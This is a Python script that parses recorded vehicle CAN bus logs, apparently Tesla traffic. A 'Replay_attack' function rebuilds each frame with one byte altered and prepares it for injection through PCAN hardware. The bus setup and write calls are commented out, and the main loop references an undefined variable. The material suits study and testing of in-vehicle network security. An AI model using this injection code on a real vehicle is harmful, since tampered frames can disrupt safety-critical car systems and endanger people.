import pandas as pd
import matplotlib.pyplot as plt
from matplotlib.pyplot import figure
import numpy as np
import time
from PCANBasic import *
from rich.console import Console

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', "Label"]


unused_byte = {'03FE': [2, '00'], '0238': [2, '9A'], '03DC': [0, '40'], '0502': [0, '00'], '027D': [0, '01'],
 '0284': [0, '10'], '0321': [4, '02'], '030E': [1, '00'], '02A8': [1, '00'], '032E': [0, '00'], '03F8': [0, '03'],
 '0231': [2, '00'], '02BC': [7, '01'], '0257': [6, '00'], '0479': [0, '00'], '0401': [0, '81'], '03D5': [1, '00'],
 '0420': [0, '28'], '02E8': [1, '00'], '0353': [1, '0F'], '037E': [2, '00'], '0103': [2, '00'], '0129': [6, 'FF'],
 '0717': [2, '00'], '03F4': [5, '01'], '0031': [2, '02'], '036F': [0, '08'], '0391': [2, '00'], '03AF': [7, 'FF'],
 '0145': [2, '00'], '030F': [3, '01'], '0410': [1, '00'], '034F': [7, 'FF'], '03C2': [1, '55'], '032B': [0, '00'],
 '0448': [0, '00'], '035D': [1, '00'], '0128': [0, '00'], '0428': [0, '00'], '0350': [0, '00'], '0371': [1, '00'], 
 '03B8': [0, '00'], '03F7': [0, '00'], '03CB': [1, '00'], '03EF': [0, '00'], '031E': [3, '14'], '0303': [0, '03'], 
 '03CA': [0, '00'], '0249': [3, '00'], '0227': [2, '00'], '03D1': [5, '00'], '021E': [4, '00'], '0186': [7, '00'],
 '0102': [2, '00'], '02F8': [5, 'DE'], '03FD': [1, '00'], '02D1': [0, 'FF'], '03FA': [7, 'FF'], '024A': [0, '00'],
 '03FC': [1, '00'], '0419': [0, '00'], '0558': [0, '84'], '036C': [0, '00'], '0239': [5, '7D'], '026E': [1, '00'],
 '039D': [4, '00'], '0221': [2, '55'], '0399': [4, 'B0'], '0108': [7, '00'], '0329': [0, '00'], '004F': [6, '79'],
 '0229': [2, '00'], '025F': [0, 'C4'], '0326': [1, '00'], '0439': [0, '00'], '0334': [0, '1F'], '0293': [0, '00'],
 '0267': [3, '00'], '03C3': [0, '55'], '0051': [2, '0A'], '0425': [0, '00'], '0720': [0, '00'], '03F0': [0, '00'],
 '0259': [0, 'D3'], '0429': [0, '00'], '03C9': [0, '03'], '0395': [1, '00'], '0449': [0, '00'], '033E': [0, '00'],
 '0459': [0, '00'], '0369': [1, '00'], '0740': [1, '00'], '0211': [2, '41'], '0234': [3, '09'],  '03DF': [0, '00'], 
 '0235': [1, '01']}

#importing dataset
def Convert_to_df(path):
    if path[-3:] == "trc":
        data_df = Convert_from_trc(path)[17:]
    elif path[-3:] == "txt": 
        data_df = Convert_from_txt(path)
    else:
        print("Error, not suitable file")
        exit()
    return data_df

def Convert_from_trc(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split(" ")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

def Convert_from_txt(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split("\t")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

def Replay_attack(data_iloc):
    all_datas = ""
    time_offset = 0.05
    Fuzzing_attack = TPCANMsg()
    Fuzzing_attack.ID = int(data_iloc[3],16)
    Fuzzing_attack.LEN = int(data_iloc[4])
    Fuzzing_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    all_datas += str(hex(Fuzzing_attack.ID)) + "\t" + str(Fuzzing_attack.MSGTYPE) + "\t" + str(hex(Fuzzing_attack.LEN)) 
    #EDITED BY DDUMWAMU: INITIALIZE YOUR VARIABLES BEFORE USING IT INSIDE THE FUNCTION YOU ***** hahahaa'
    unused_index = 0

    if data_iloc[3] in unused_byte:
        unused_index = unused_byte[data_iloc[3]][0]
        if unused_index == None:
            return

    for i in range(int(data_iloc[4])):
        if unused_index == i :
            Fuzzing_attack.DATA[i] = int(data_iloc[5+i], 16) + 1
            all_datas += "\t" + bcolors.OKGREEN + str(hex(Fuzzing_attack.DATA[i])) + bcolors.ENDC
        else:
            Fuzzing_attack.DATA[i] = int(data_iloc[5+i], 16)
            all_datas += "\t" + str(hex(Fuzzing_attack.DATA[i]))
    unused_index = 0
    all_datas += "\n"
    print(all_datas)
    # res = CAN.Write(CAN_BUS, Fuzzing_attack)
    # if res != PCAN_ERROR_OK:
    #     print("Oh nooo")
    #     result = CAN.GetErrorText(res)
    #     print(result)
    #     exit()
    time.sleep(time_offset)


if __name__ == "__main__":
        
    # CAN = PCANBasic()                            #CAN 생성자 
    # CAN_BUS = PCAN_USBBUS6
    # CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    
    
    dataset_path = "Dataset\\"
    dataset_name = "Collected Dataset 2023-07-25-3 (tesla).txt"
    df_dataset = Convert_to_df(dataset_path+dataset_name)
    nID = list(dict.fromkeys(df_dataset["ID"]))
    ilo_df = df_dataset.iloc
    l = len(df_dataset)
    for i in range(l - 1):
        print(bcolors.OKBLUE)
        time_off = time.time() - start_time
        print("%.2f" % time_off, end="\t")
        print(str(ilo_df[i][3]), end="\t")
        print(ilo_df[i][2], end="\t")
        print(ilo_df[i][4], end="\t")
        for j in range(int(ilo_df[i][4])):
            print(ilo_df[i][5+j], end = '\t')
        print(bcolors.ENDC)
        Replay_attack(ilo_df[i])
    
    
    

